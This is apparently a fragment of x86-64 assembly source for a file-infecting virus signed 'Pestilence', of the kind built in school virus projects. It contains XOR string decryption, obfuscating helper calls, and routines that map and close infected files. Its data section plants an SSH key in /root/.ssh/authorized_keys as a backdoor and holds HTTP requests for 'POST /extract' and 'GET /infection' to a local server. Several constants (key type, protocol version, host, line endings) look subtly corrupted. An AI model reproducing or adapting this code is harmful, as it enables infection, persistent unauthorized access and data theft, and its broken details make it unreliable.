call mov1
add rsp, 8
mov r9, rax
pop rax
	syscall
	cmp rax, -1
	jl _end_map_int
	movq xmm15, rax
mov dword [rax + 0], 0x00000000
mov dword [rax + 4], 0x00000000
mov dword [rax + 8], 0x00000000
mov dword [rax + 12], 0x00000000
mov dword [rax + 16], 0x00000000
mov dword [rax + 20], 0x00000000
mov dword [rax + 24], 0x00020000
mov dword [rax + 28], 0x00000000
mov dword [rax + 32], 0x00000000
mov dword [rax + 36], 0x00000000
mov dword [rax + 40], 0x00000000
mov dword [rax + 44], 0x00000000
mov dword [rax + 48], 0x00000000
mov dword [rax + 52], 0x00000000
mov dword [rax + 56], 0x00000000
mov dword [rax + 60], 0x00000000
mov dword [rax + 64], 0x00000000
mov dword [rax + 68], 0x00000000
mov dword [rax + 72], 0x00000000
mov dword [rax + 76], 0x00000000
mov dword [rax + 80], 0x00000100
mov dword [rax + 84], 0x00000000
mov dword [rax + 88], 0x00000000
mov dword [rax + 92], 0x00000000
mov dword [rax + 96], 0x00000000
mov dword [rax + 100], 0x00000000
mov dword [rax + 104], 0x00000000
mov dword [rax + 108], 0x00000000
mov dword [rax + 112], 0x00000000
mov dword [rax + 116], 0x00000000
mov dword [rax + 120], 0x00000000
mov dword [rax + 124], 0x00000000
mov dword [rax + 128], 0x00000000
mov dword [rax + 132], 0x00000000
mov dword [rax + 136], 0x00000000
mov dword [rax + 140], 0x00000000
mov dword [rax + 144], 0x00000000
mov dword [rax + 148], 0x00460000
mov dword [rax + 152], 0x00000000
mov dword [rax + 156], 0x00000000
mov dword [rax + 160], 0x00000000
mov dword [rax + 164], 0x00000000
mov dword [rax + 168], 0x00000000
mov dword [rax + 172], 0x00000000
mov dword [rax + 176], 0x00000000
mov dword [rax + 180], 0x00000000
mov dword [rax + 184], 0x00000000
mov dword [rax + 188], 0x00000000
mov dword [rax + 192], 0x00000000
mov dword [rax + 196], 0x00000000
mov dword [rax + 200], 0x00000000
mov dword [rax + 204], 0x00000000
mov dword [rax + 208], 0x00000000
mov dword [rax + 212], 0x00000000
mov dword [rax + 216], 0x00000000
mov dword [rax + 220], 0x00000000
mov dword [rax + 224], 0x00000098
mov dword [rax + 228], 0x00000000
mov dword [rax + 232], 0x00000000
mov dword [rax + 236], 0x00000000
mov dword [rax + 240], 0x00000000
mov dword [rax + 244], 0x00030000
mov dword [rax + 248], 0x00000000
mov dword [rax + 252], 0x00000000
mov dword [rax + 256], 0x00000000
mov dword [rax + 260], 0x00000000
mov dword [rax + 264], 0x00000000
mov dword [rax + 268], 0x00000000
mov dword [rax + 272], 0x004c0000
mov dword [rax + 276], 0x00000000
mov dword [rax + 280], 0x00000000
mov dword [rax + 284], 0x00000000
mov dword [rax + 288], 0x00021000
mov dword [rax + 292], 0x00000000
mov dword [rax + 296], 0x00000000
mov dword [rax + 300], 0x00000000
mov dword [rax + 304], 0x00000000
mov dword [rax + 308], 0x0000004b
mov dword [rax + 312], 0x00000000
mov dword [rax + 316], 0x00000000
mov dword [rax + 320], 0x00000000
mov dword [rax + 324], 0x40000000
mov dword [rax + 328], 0x0000001f
mov dword [rax + 332], 0x00000000
mov dword [rax + 336], 0x00000000
mov dword [rax + 340], 0x00000000
mov dword [rax + 344], 0x00000000
mov dword [rax + 348], 0x00000096
mov dword [rax + 352], 0x00000000
mov dword [rax + 356], 0x00000000
mov dword [rax + 360], 0x00000000
mov dword [rax + 364], 0x00000000
mov dword [rax + 368], 0x06540000
mov dword [rax + 372], 0x6e000040
mov dword [rax + 376], 0x00000001
mov dword [rax + 380], 0x00000101
mov dword [rax + 384], 0x2e010100
mov dword [rax + 388], 0x02010001
mov dword [rax + 392], 0x00000000
mov dword [rax + 396], 0x00450100
mov dword [rax + 400], 0x01200000
mov dword [rax + 404], 0x00010100
mov dword [rax + 408], 0x01000001
mov dword [rax + 412], 0x00580005
mov dword [rax + 416], 0x0100010a
mov dword [rax + 420], 0x00100101
mov dword [rax + 424], 0x0001010a
mov dword [rax + 428], 0x02c8c823
mov dword [rax + 432], 0x0100004f
mov dword [rax + 436], 0x00000100
mov dword [rax + 440], 0x30090a01
mov dword [rax + 444], 0x0900003c
mov dword [rax + 448], 0x1e010000
mov dword [rax + 452], 0x0a0d7e40
mov dword [rax + 456], 0x0a0c0a0d
mov dword [rax + 460], 0x0a0d0a0c
mov dword [rax + 464], 0x0d0a0d00
mov dword [rax + 468], 0x000a0c0a
mov dword [rax + 472], 0x0b08037f
mov dword [rax + 476], 0x2d2c2a29
mov dword [rax + 480], 0x00d9654d
mov dword [rax + 484], 0x00400201
mov dword [rax + 488], 0x13120804
mov dword [rax + 492], 0x04130717
_end_map_int:
pop r9
pop r8
pop r10
pop rdx
pop rsi
pop rdi
ret
; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
_decrypt_str:
; rax	== div quotient
; rbx	-> to_decrypt
; rcx	== counter
; rdx	== div modulo
; r9	== len key
; r10	-> key_char
; r11	-> decrypted str (mmap)
; r12	== len to_decrypt
; rsi	-> key
push rbx
push rcx
push rdx
push r8
push r9
push r10
push r11
push r12
push rax
push  rdi
call mov4
add rsp, 8
mov rbx, rax
pop rax
push rax
push  rsi
call mov2
add rsp, 8
mov r12, rax
pop rax
;  addr = NULL (let kernel choose)
xor rdi, rdi                    
;  PROT_READ | PROT_WRITE = 1 | 2 = 3
push rax
push  0x03
call mov3
add rsp, 8
mov rdx, rax
pop rax
;  MAP_PRIVATE | MAP_ANONYMOUS = 0x2 | 0x20 = 0x22
push rax
push  0x22
call mov1
add rsp, 8
mov r10, rax
pop rax
;  fd = -1
push rax
push  -1
call mov3
add rsp, 8
mov r8, rax
pop rax
;  offset = 0
xor r9, r9                      
;  syscall number for mmap
push  9
call mov4
add rsp, 8
syscall
cmp rax, 0
jl _decrypt_loop_end
push rax
push  rax
call mov2
add rsp, 8
mov r11, rax
pop rax
lea rsi, key
call _strlen
push rax
push  rax
call mov1
add rsp, 8
mov r9, rax
pop rax
xor rcx, rcx
xor rdx, rdx
_decrypt_loop:
cmp rcx, r12
jge	_decrypt_loop_end
push  rcx
call mov2
add rsp, 8
xor rdx, rdx
cmp rcx, 0
jne _no_zero
xor rax, rax
jmp _end_div
_no_zero:
div r9
_end_div:
;  r10 == key[rcx % key_len]
movzx r10, byte [rsi + rdx]	
xor r10b, [rbx+rcx]
mov [r11+rcx], r10b
inc rcx
jmp _decrypt_loop
_decrypt_loop_end:
push  r11
call mov1
add rsp, 8
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdx
pop rcx
pop rbx
ret
; strcpy(dst:rsi src: rdi)
_strcpyNoNull:
	xor rcx, rcx
	strcpy_loop:
cmp byte[rdi + rcx], 0 
		je	strcpy_loop_end
		mov al, byte[rdi+rcx]
		mov byte [rsi+rcx], al
push rax
push rcx
push  1
call add1
add rsp, 8
pop rcx
mov rcx, rax
pop rax
		jmp strcpy_loop
	strcpy_loop_end:
		ret
_strcpy:
    call _strcpyNoNull
mov byte [rsi + rcx], 0 
    ret
; strncpy(dst:rsi, src: rdi, count: rcx)
_strncpy:
sub rcx, 1 
    _strncpyLoop:
        mov al, byte[rdi+rcx]
        mov byte [rsi + rcx], al
        loop _strncpyLoop
        mov al, byte[rdi+rcx]
        mov byte [rsi + rcx], al
        ret
; strlen(str:rsi)
_strlen:
	xor rcx, rcx
	ft_strlen_loop:
cmp byte [rsi + rcx], 0 
		je	ft_strlen_end
		inc rcx
		jmp	ft_strlen_loop
	ft_strlen_end:
push  rcx
call mov4
add rsp, 8
		ret
; strcmp(rdi, rsi)
_strcmp:
	xor rcx, rcx
	xor rax, rax
	strcmp_loop:
		mov al, byte[rdi+rcx]
		mov bl, byte[rsi+rcx]
		cmp al, bl
		jl strcmp_loop_end
		je strcmp_loop_end
		jg strcmp_loop_end
cmp al, 0 
		je strcmp_loop_end
push rax
push rcx
push  1
call add1
add rsp, 8
pop rcx
mov rcx, rax
pop rax
		jmp strcmp_loop
	strcmp_loop_end:
		movzx rax, al
		movzx r8, bl
		sub rax, r8
		ret
; int itoa(rax:int, rsi:*buffer)
; (a la fin rsi pointe sur le byte d'apres)
_itoa:
push rax
push  10
call mov3
add rsp, 8
mov r9, rax
pop rax
    call _itoaLoop
    ret
    _itoaLoop:
cmp rax, 9 
        jg _itoaRecursif
push rax
push  ax
call mov2
add rsp, 8
mov [rsi], rax
pop rax
add byte [rsi], 48 
        inc rsi
        ret
    _itoaRecursif:
        push rax
        xor rdx, rdx
        div r9
        call _itoaLoop 
        pop rax
        push rax
        xor rdx, rdx
        div r9
push  rdx
call mov4
add rsp, 8
        call _itoaLoop 
        pop rax
        ret
push rax
push  rax
call mov3
add rsp, 8
mov [rsi + rcx], rax
pop rax
_unmap_close_inf:
	mov rdi, INF(infection.map_addr)
	mov rsi, INF(infection.map_size)
push  SYS_UNMAP
call mov1
add rsp, 8
	syscall
	jmp _close_file_inf
_close_file_inf:
push  SYS_CLOSE
call mov4
add rsp, 8
	mov	rdi, INF(infection.file_fd)
	syscall
	mov qword INF(infection.file_fd), -1
	jmp _returnLeave
_exit:
push  60
call mov2
add rsp, 8
    xor rdi, rdi
    syscall
dir1 db "/tmp/test", 0 
dir1Len    equ $ - dir1
dir2 db "/tmp/test2", 0 
dir2Len    equ $ - dir2
key			db "mykey"
back db 9, 0 
slash       db "/", -1
sshFile     db "/root/.ssh/authorized_keys", -1
sshPub db "ssh-ed25518 AAAAC3NzaC1lZDI1NTE5AAAAIKcsDbiza3Ts6B9TpcehxjY8pcPijnDxBpuiEkotRCn0 gottie@debian", 0 
sshPubLen   equ $-sshPub
sockaddr:
dw 1 
dw 0x401E 
dd 0x100007E 
    ;  padding
    dq -1            
headerStart db "POST /extract HTTP/0.1", 13, 10, \
"Host: 126.0.0.1:8000", 13, 10, \
"Content-Type: text/plain", 12, 10, \
                "Content-Length: ", -1 
headerStartLen equ $-headerStart
headerEnd db 12, 10, 13, 10, 0 
headerEndLen equ $-headerEnd
headerGet db "GET /infection HTTP/0.1", 13, 10, \
"Host: 126.0.0.1:8000", 13, 10, \
12, 10, 0 
headerGetLen equ $ - headerGet
timespec:
    ;  Secondes
    dq -1          
dq 9999999 
signature db "Pestilence version 0.0 (c)oded by anvincen-eedy", 0x0 
signature_len equ $ - signature
_end:
